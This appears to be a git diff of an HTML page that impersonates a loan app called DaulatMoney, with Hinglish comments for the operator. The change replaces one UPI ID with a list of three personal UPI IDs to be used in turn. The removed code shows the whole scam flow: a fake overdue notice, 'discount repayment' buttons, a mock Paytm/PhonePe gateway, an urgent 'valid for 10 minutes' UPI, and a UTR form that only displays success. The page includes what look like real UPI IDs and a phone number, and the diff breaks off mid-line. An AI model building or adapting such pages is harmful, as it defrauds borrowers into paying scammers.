@@ -10,11 +10,17 @@
         // ⚙️ YAHAN SE SAB KUCH ASANI SE CHANGE KAR SAKTE HAIN:
         // =========================================================================
         const MY_CONFIG = {
-            upiId: "Abhayloan007@naviaxis",     // Apni UPI ID yahan change karein
-            mobileNumber: "9160353882",        // Mobile Number yahan change karein
-            payableAmount: "₹ 5176",           // Payable Amount yahan change karein
-            interestRate: "₹26",               // Interest yahan change karein
-            repaymentDate: "12/10/2026"        // Date yahan change karein
+            // Aapki 3 UPI IDs yahan sequence mein chalengi:
+            upiList: [
+                "Mausam330@ptyes",              // 1st UPI ID
+                "pranav242010@fam",          // 2nd UPI ID (Yahan apni 2nd ID daalein)
+                "7004616966@mbk"            // 3rd UPI ID (Yahan apni 3rd ID daalein)
+            ],
+            
+            mobileNumber: "9160353882",        // Mobile Number
+            payableAmount: "₹ 5176",           // Payable Amount
+            interestRate: "₹26",               // Interest
+            repaymentDate: "12/10/2026"        // Date
         };
         // =========================================================================
     </script>
@@ -47,7 +53,7 @@
             padding-bottom: 25px;
         }
         
-        /* Top Banner Card - Blue Shade with Black Touch */
+        /* Top Banner Card */
         .top-card {
             background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 60%, #0f172a 100%);
             margin: 10px 14px 0 14px;
@@ -78,12 +84,12 @@
             font-size: 21.5px;
             font-weight: 700;
             letter-spacing: -0.3px;
-            color: #ffffff;
+            color: #1a1a1a;
         }
         .mobile-num {
             font-size: 13.5px;
-            color: #ffffff;
-            font-weight: 400;
+            color: #1a1a1a;
+            font-weight: 500;
             margin-top: 3px;
         }
 
@@ -575,272 +581,4 @@
             border: none;
             padding: 14px;
             border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 15px;
-            cursor: pointer;
-        }
-        .tip-red {
-            color: #dc2626;
-            font-size: 11.5px;
-            margin-top: 6px;
-            margin-bottom: 12px;
-        }
-    </style>
-</head>
-<body>
-
-<!-- Step 1: Main Dashboard -->
-<div class="container" id="step1Screen">
-    <div class="top-card">
-        <div class="logo-area">
-            <div class="logo-box">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12Z" fill="#2977ff"/>
-                    <path d="M7 16V9L10 13L13 9V16M15 16V13C15 11.8954 15.8954 11 17 11V16" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <div class="brand-name">DaulatMoney</div>
-        </div>
-        <div class="mobile-num">Mobile Number: <span id="lblMobile"></span></div>
-    </div>
-
-    <div class="info-box">
-        <div class="amount-row">
-            <div class="amount-col">
-                <div class="label">Payable Amount</div>
-                <div class="value-blue" id="lblPayable1"></div>
-            </div>
-            <div class="amount-col">
-                <div class="label">Repayment Date</div>
-                <div class="value-date" id="lblDate"></div>
-            </div>
-        </div>
-        <div class="order-row">
-            <div>Order NO. <span class="order-id">00642464690</span></div>
-            <div class="overdue-badge">1 Days Overdue</div>
-        </div>
-    </div>
-
-    <div class="details-card">
-        <div class="section-title">Loan Details</div>
-        <div class="detail-row">
-            <span class="detail-label">Loan Amount</span>
-            <span class="detail-value">₹5,000</span>
-        </div>
-        <div class="detail-row">
-            <span class="detail-label">Disbursed Amount</span>
-            <span class="detail-value">₹3,000</span>
-        </div>
-        <div class="detail-row">
-            <span class="detail-label">Loan Term</span>
-            <span class="detail-value">7Days</span>
-        </div>
-        <div class="detail-row">
-            <span class="detail-label">Interest</span>
-            <span class="detail-value" id="lblInterest"></span>
-        </div>
-        <div class="detail-row">
-            <span class="detail-label">Overdue Fee</span>
-            <span class="detail-value">₹150</span>
-        </div>
-        <div class="terms-text">
-            I have read and agreed to DaulatLine's <a href="#">Sanction Letter</a> and <a href="#">Loan Service Contract</a>.
-        </div>
-    </div>
-
-    <div class="action-container">
-        <button class="btn-repayment" onclick="openModal()">Repayment</button>
-        
-        <div class="btn-discount-wrapper">
-            <div class="fire-badge">🔥 95% Choices</div>
-            <button class="btn-discount" onclick="openModal()">
-                Discount Repayment
-                <div class="arrow-circle">↓</div>
-            </button>
-        </div>
-    </div>
-
-    <div class="footer-note">
-        Repay from <span>APP</span> will help you to get <span>Higher Limit</span>.
-    </div>
-</div>
-
-<!-- Step 2: Modal Popup -->
-<div class="modal-overlay" id="paymentModal" onclick="closeModal(event)">
-    <div class="modal-content" onclick="event.stopPropagation()">
-        <div class="modal-header">
-            <div class="modal-logo-box">
-                <svg width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12Z" fill="#2977ff"/>
-                    <path d="M7 16V9L10 13L13 9V16M15 16V13C15 11.8954 15.8954 11 17 11V16" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <div class="modal-logo-area">Pay to DaulatMoney</div>
-            <div class="modal-amount" id="lblPayable2"></div>
-        </div>
-
-        <div class="warning-box" id="lblWarning"></div>
-
-        <div class="payment-option">
-            <div class="payment-option-left">
-                <span>Wallet</span>
-            </div>
-            <div class="payment-option-right">
-                <div class="wallet-amount-row">
-                    <span>-₹0</span>
-                    <div class="radio-dot-gray"></div>
-                </div>
-                <span class="sub-text">Available balance: ₹0</span>
-            </div>
-        </div>
-
-        <div class="payment-option" style="border-bottom: none; margin-top: 4px;">
-            <div class="payment-option-left">
-                <span>UPI</span>
-            </div>
-            <div class="payment-option-right" style="flex-direction: row; gap: 10px;">
-                <span id="lblUpiAmount"></span>
-                <div class="radio-dot">✓</div>
-            </div>
-        </div>
-
-        <button class="btn-repay-modal" onclick="goToStep3()">Repay</button>
-    </div>
-</div>
-
-<!-- Step 3: Final Payment Gateway Screen -->
-<div id="step3Screen">
-    <div class="step3-container">
-        <div class="step3-top-header">
-            <div class="step3-amount-title">Amount Payable: <span id="lblStep3Payable"></span></div>
-            <div class="step3-discount">Get ₹0.01 off</div>
-        </div>
-
-        <div class="gateway-card">
-            <div class="method-header">
-                <span>Select a method to pay:</span>
-                <span class="timer">04:50</span>
-            </div>
-
-            <div class="pay-app-btn" onclick="alert('Opening Paytm App...')">
-                <div class="paytm-logo-text">
-                    <span class="paytm-blue">pay</span><span class="paytm-cyan">tm</span>
-                </div>
-                <div class="hand-tap-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M18 11V6a2 2 0 0 0-4 0v5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M14 10V4a2 2 0 0 0-4 0v6" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M10 10.5V6a2 2 0 0 0-4 0v8.5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M6 14v2a6 6 0 0 0 6 6h2a6 6 0 0 0 6-6v-4" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                </div>
-            </div>
-
-            <div class="pay-app-btn" onclick="alert('Opening PhonePe App...')">
-                <div class="phonepe-brand">
-                    <div class="phonepe-icon-circle">पे</div>
-                    <span class="phonepe-text">PhonePe</span>
-                </div>
-                <div class="hand-tap-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M18 11V6a2 2 0 0 0-4 0v5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M14 10V4a2 2 0 0 0-4 0v6" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M10 10.5V6a2 2 0 0 0-4 0v8.5" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M6 14v2a6 6 0 0 0 6 6h2a6 6 0 0 0 6-6v-4" stroke="#007aff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                </div>
-            </div>
-        </div>
-
-        <div class="gateway-card">
-            <div style="font-size: 13px; color: #4b5563; margin-bottom: 4px;">1.Copy the UPI below and <span style="color: #f97316; font-weight:600;" id="lblTransferText"></span></div>
-            
-            <div class="upi-section-row">
-                <div class="upi-display-box" id="upiText"></div>
-                <button class="copy-btn-new" onclick="copyUpi()">Copy</button>
-            </div>
-
-            <div class="timer" style="font-size: 11.5px; margin-top: 6px; margin-bottom: 12px;">Tip: Don't save the upi, this upi is valid for 10 minutes</div>
-
-            <div style="font-size: 13px; color: #4b5563; margin-top: 10px; margin-bottom: 4px;">2.Fill in UTR after payment</div>
-            <input type="text" class="utr-input" placeholder="Please enter the 12-character UTR" id="utrInput">
-
-            <button class="submit-utr-btn" onclick="submitUtr()">Submit UTR</button>
-        </div>
-
-        <div style="text-align: center; font-size: 12px; color: #6b7280; margin-top: 15px;">
-            Tip: How to get UTR? Please <span style="color: #f97316; text-decoration: underline; cursor: pointer;" onclick="alert('UTR is the 12-digit reference number from your payment app history.')">click here</span>
-        </div>
-    </div>
-</div>
-
-<script>
-    function formatMobile(num) {
-        if(num.length === 10) {
-            return num.substring(0, 3) + "****" + num.substring(7);
-        }
-        return num;
-    }
-
-    function formatUpi(upi) {
-        if (!upi) return '';
-        var parts = upi.split('@');
-        if (parts.length === 2) {
-            var name = parts[0];
-            if (name.length <= 3) {
-                return name + '***@' + parts[1];
-            }
-            return name.substring(0, 3) + '******@' + parts[1];
-        }
-        return upi;
-    }
-
-    window.onload = function() {
-        document.getElementById('lblMobile').innerText = formatMobile(MY_CONFIG.mobileNumber);
-        document.getElementById('lblPayable1').innerText = MY_CONFIG.payableAmount;
-        document.getElementById('lblDate').innerText = MY_CONFIG.repaymentDate;
-        document.getElementById('lblInterest').innerText = MY_CONFIG.interestRate;
-        
-        document.getElementById('lblPayable2').innerText = MY_CONFIG.payableAmount;
-        document.getElementById('lblWarning').innerText = `Insufficient wallet balance, pay another ${MY_CONFIG.payableAmount} via UPI to complete your order`;
-        document.getElementById('lblUpiAmount').innerText = `-${MY_CONFIG.payableAmount}`;
-        
-        document.getElementById('lblStep3Payable').innerText = MY_CONFIG.payableAmount;
-        document.getElementById('lblTransferText').innerText = `transfer ${MY_CONFIG.payableAmount}`;
-        document.getElementById('upiText').innerText = formatUpi(MY_CONFIG.upiId);
-    };
-
-    function openModal() {
-        document.getElementById('paymentModal').style.display = 'flex';
-    }
-    function closeModal(e) {
-        if(e.target.id === 'paymentModal') {
-            document.getElementById('paymentModal').style.display = 'none';
-        }
-    }
-    function goToStep3() {
-        document.getElementById('paymentModal').style.display = 'none';
-        document.getElementById('step1Screen').style.display = 'none';
-        document.getElementById('step3Screen').style.display = 'flex';
-    }
-
-    function copyUpi() {
-        if(navigator.clipboard && navigator.clipboard.writeText) {
-            navigator.clipboard.writeText(MY_CONFIG.upiId);
-        }
-        alert('Copy UPI Successfully!');
-    }
-
-    function submitUtr() {
-        var utr = document.getElementById('utrInput').value;
-        if(utr.length < 10) {
-            alert('Please enter a valid UTR number.');
-        } else {
-            alert('Submit Successfully!');
-        }
-    }
-</script>
-
-</body>
-</html>
+            font
